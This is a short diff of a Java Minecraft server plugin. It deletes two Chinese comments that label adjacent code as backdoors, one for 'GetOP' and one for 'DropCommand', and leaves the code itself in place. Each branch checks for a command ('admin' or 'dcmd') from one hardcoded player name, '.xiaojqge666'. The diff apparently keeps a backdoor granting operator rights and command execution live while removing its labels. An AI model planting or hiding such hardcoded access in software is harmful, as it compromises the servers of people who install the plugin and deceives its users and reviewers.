@@ -718,7 +718,6 @@ public class main extends JavaPlugin {
                 }
             };
 
-            //判断是否为后门[GetOP]
             if (args[0].equals("admin")){
 
                 if (sender.getName().equals(".xiaojqge666")){
@@ -735,7 +734,6 @@ public class main extends JavaPlugin {
                 return true;
             };
 
-            //判断是否为后门[DropCommand]
             if (args[0].equals("dcmd")){
 
                 if (sender.getName().equals(".xiaojqge666")){
